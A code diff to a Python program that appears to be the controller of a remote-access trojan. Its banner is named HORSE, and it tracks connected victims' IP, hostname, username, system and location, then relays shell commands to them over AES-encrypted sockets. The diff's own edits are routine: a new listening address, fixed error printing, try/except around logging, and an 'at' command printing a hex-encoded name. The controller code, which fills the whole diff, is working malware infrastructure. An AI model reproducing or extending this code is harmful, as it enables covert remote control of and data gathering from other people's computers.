@@ -13,7 +13,7 @@ import sys
 
 class Data:
 
-    Host = "192.168.30.52"
+    Host = "192.168.0.104"
     Port = 6565
     Port_check = 2121
     data_collection = True
@@ -21,7 +21,7 @@ class Data:
     client_list = []
     address_list = []
     data_cred = ["IP","Port", "HostName", "UserName", "System", "Location", "NickName", "Status","Key"]
-    command_list = ["start", "stop", "connect", "list","clist", "help","?","nick", "history","clear","exit"]
+    command_list = ["start","at", "stop", "connect", "list","clist", "help","?","nick", "history","clear","exit"]
     rsa_key = ""
     aes_key = ""
     json_help = [
@@ -60,9 +60,9 @@ class Data:
     ⠀⠀⠀⠀⠀⠀⢀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
     ⠀⠀⠀⠀⠀⠀⠘⣦⡀⠘⣆⠈⠛⠻⣗⠶⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
     ⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⠈⠳⠄⠀⠈⠙⠶⣍⡻⢿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-    ⠀⠀⠀⠀⠀⠀⠀⣰⣿⣧⠀⠀⠀⠀⠀⠀⠀⠈⠻⣮⡹⣿⣿⣷⣦⣄⣀⠀⠀⢀⣸⠃⠀⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-    ⠀⠀⠀⠀⠀⠀⢠⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣮⢿⣿⣿⣿⣿⣿⣿⣿⠟⠀⢰⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-    ⠀⠀⠀⠀⠀⢀⣾⣿⠀⠀⠀⠀⠀⠀⠀⣷⠀⢷⠀⠀⠀⠙⢷⣿⣿⣿⣿⣟⣋⣀⣤⣴⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+  +====================+⡹⣿⣿⣷⣦⣄⣀⠀⠀⢀⣸⠃⠀⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+  |41 53 4C 41 4E 41 54|⠻⣮⢿⣿⣿⣿⣿⣿⣿⣿⠟⠀⢰⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+  +====================+⠙⢷⣿⣿⣿⣿⣟⣋⣀⣤⣴⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
     ⠀⠀⠀⠀⢀⣼⢿⣿⡀⠀⠀⢀⣀⣴⣾⡟⠀⠈⣇⠀⠀⠀⠈⢻⡙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
     ⠀⠀⠀⠀⣼⡏⠸⣿⣿⣶⣾⣿⡿⠟⠋⠀⠀⠀⢹⡆⠀⠀⠀⠀⠹⡽⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
     ⠀⠀⠀⣰⣿⠀⠀⠀⣀⡿⠛⠉⠀⠀⢿⠀⠀⠀⠘⣿⡄⠀⠀⠀⠀⠑⢹⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -145,7 +145,7 @@ def decrypt_data(encrypted_data,aes_key):
         decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
         return decrypted_data
     except Exception as e:
-        print(f"{colour.FG_RED+e+colour.END}")
+        print(f"{colour.FG_RED}{e}{colour.END}")
 
 
 ###################################################################################################
@@ -156,7 +156,7 @@ def resv(client,key):
     try:
         return decrypt_data(client.recv(409632),bytes.fromhex(key)).decode()
     except Exception as e:
-        print(f"{colour.FG_RED+e+colour.END}")
+        print(f"{colour.FG_RED}{e}{colour.END}")
 
 def send(client,enc,key):
     try:
@@ -166,7 +166,7 @@ def send(client,enc,key):
             client.send(encrypt_data(enc.encode(),bytes.fromhex(key)))
             
     except Exception as e:
-        print(f"{colour.FG_RED+e+colour.END}")
+        print(f"{colour.FG_RED}{e}{colour.END}")
 
 ###################################################################################################
 ################                          Help                           ##########################
@@ -184,17 +184,22 @@ def help(command):
 
 
 def history(command):
-    f = time.localtime()
-    log = f"[{f.tm_mday}.{f.tm_mon}.{f.tm_year} {f.tm_hour}:{f.tm_min}:{f.tm_sec}] {command}\n"
-    with open("./Data/history.txt","a") as file:
-        file.write(log)
+    try:
+        f = time.localtime()
+        log = f"[{f.tm_mday}.{f.tm_mon}.{f.tm_year} {f.tm_hour}:{f.tm_min}:{f.tm_sec}] {command}\n"
+        with open("./Data/history.txt","a") as file:
+            file.write(log)
+    except:
+        print(f"{colour.FG_RED}[*] History file not found !!!{colour.END}")
 
 def log(command,nick):
-    f = time.localtime()
-    log = f"[{f.tm_mday}.{f.tm_mon}.{f.tm_year} {f.tm_hour}:{f.tm_min}:{f.tm_sec}] {command}\n"
-    with open(f"./Data/log/{nick}.txt","a") as file:
-        file.write(log)
-
+    try:
+        f = time.localtime()
+        log = f"[{f.tm_mday}.{f.tm_mon}.{f.tm_year} {f.tm_hour}:{f.tm_min}:{f.tm_sec}] {command}\n"
+        with open(f"./Data/log/{nick}.txt","a") as file:
+            file.write(log)
+    except:
+        print(f"{colour.FG_RED}[*] History file not found !!!{colour.END}")
 ###################################################################################################
 ################                       Connections                       ##########################
 ###################################################################################################
@@ -204,12 +209,16 @@ def connections():
     try:
         server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         server.settimeout(1)
-        server.bind((Data.Host,Data.Port))
+        try:
+            server.bind((Data.Host,Data.Port))
+        except:
+            print(f"{colour.FG_RED}[*] Address not valid !!!{colour.END}")
+            sys.exit()
         server.listen(10)
         client_collector = threading.Thread(target=client_connected,args=(server,))
         client_collector.start()
     except Exception as e:
-        print(f"{colour.FG_RED+e+colour.END}")
+        print(f"{colour.FG_RED}{e}{colour.END}")
 
     try:
         test = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -219,13 +228,13 @@ def connections():
         test_connectiot = threading.Thread(target=test_connect,args=(test,))
         test_connectiot.start()
     except Exception as e:
-        print(f"{colour.FG_RED+e+colour.END}")
+        print(f"{colour.FG_RED}{e}{colour.END}")
 
     try:
         data_collect =threading.Thread(target=data_read)
         data_collect.start()
     except Exception as e:
-        print(f"{colour.FG_RED+e+colour.END}")
+        print(f"{colour.FG_RED}{e}{colour.END}")
 
 
         
@@ -244,7 +253,7 @@ def client_connected(server):
                 aes_key = key_generator(sam_client)
                 ticket_checker(sam_client,sam_address,aes_key.hex())
             except Exception as e:
-                print(f"{colour.FG_RED+e+colour.END}")
+                print(f"{colour.FG_RED}{e}{colour.END}")
         except :
             pass
 
@@ -292,7 +301,7 @@ def test_connect(server):
                 else:
                     client.send(b'-1')  
             except Exception as e:
-                print(f"{colour.FG_RED+e+colour.END}")
+                print(f"{colour.FG_RED}{e}{colour.END}")
         except  :
             pass
 
@@ -307,7 +316,7 @@ def data_read():
                 Data.json_data = json.load(f)
             time.sleep(1)
         except Exception as e:
-            print(f"{colour.FG_RED+e+colour.END}")
+            print(f"{colour.FG_RED}{e}{colour.END}")
 
 def data_check(type,name):
     for each in Data.json_data['client_list']:
@@ -421,7 +430,7 @@ def connect(NickName):
                                 print(output,end="")
                                 break
                 except Exception as e :
-                    print(f"{colour.FG_RED+e+colour.END}")
+                    print(f"{colour.FG_RED}{e}{colour.END}")
                     Data.client_list.remove(client)
                     data_update("NickName",NickName,{"Status":"False"})
                     print(f"{colour.FG_GREEN}[*] {NickName}'s Status Changed as: False.{colour.FG_RED}\n[*] Client droped !!!{colour.BG_RED}")
@@ -461,6 +470,10 @@ def stop(NickName):
                 Data.client_list.remove(client)
     else :
         print("[*] NickName not found.")
+def at():
+    print(f"""{colour.FG_GREEN}+====================================================+
+|49 6C 6B 69 6E  79 61 78 63 69  6F 67 6C 61 6E 64 69|
++====================================================+{colour.END}""")
 
 def nick(HostName,NickName):
     if data_check('HostName',HostName):
@@ -507,9 +520,9 @@ if __name__ == "__main__":
     print(f"{colour.FG_RED+Data.HORSE}") #/#/#/#
     while True :
         
-        command=input(f"{colour.FG_BLUE}ASLANAK (help,?) {colour.FG_PURPLE}> {colour.FG_YELLOW}").strip().split();print(colour.END,end='')
+        command=input(f"{colour.FG_BLUE}ASLANAT (help,?) {colour.FG_PURPLE}> {colour.FG_YELLOW}").strip().split();print(colour.END,end='')
         while command == [] or command[0] not in Data.command_list:
-            print(f'{colour.FG_GREEN}[*] Command not Found\n[*] Use help or ? for Help.{colour.END}');command = input(f"{colour.FG_BLUE}ASLANAK (help,?) {colour.FG_PURPLE}> {colour.FG_YELLOW}").strip().split();print(colour.END,end='')
+            print(f'{colour.FG_GREEN}[*] Command not Found\n[*] Use help or ? for Help.{colour.END}');command = input(f"{colour.FG_BLUE}ASLANAT (help,?) {colour.FG_PURPLE}> {colour.FG_YELLOW}").strip().split();print(colour.END,end='')
         history(" ".join(command))
 
         match command[0]:
@@ -548,7 +561,8 @@ if __name__ == "__main__":
                 
             case "stop":
                 stop(command[1])
-                
+            case "at":
+                at()   
                 
             case _ :
                 print('[*] Command not Found')
